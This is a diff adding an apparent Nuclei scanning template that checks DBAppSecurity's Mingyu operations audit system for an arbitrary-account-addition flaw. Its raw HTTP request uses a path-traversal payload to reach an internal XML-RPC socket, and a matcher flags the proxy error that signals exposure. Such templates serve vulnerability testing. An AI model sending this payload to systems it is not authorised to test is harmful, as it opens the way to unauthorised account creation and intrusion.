@@ -1,0 +1,26 @@
+id: das-usm-arbitrary-user-add
+
+info:
+  name: das-usm-arbitrary-user-add
+  author: SleepingBag945
+  severity: critical
+  description: |
+    安恒信息-明御运维审计与风险控制系统 任意账号添加
+  metadata:
+  tags: das
+
+http:
+  - raw:
+      - |
+        GET /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 502 && contains(body_1,"502 Proxy Error") && contains(body_1,"The proxy server could not handle the request")
+        condition: and
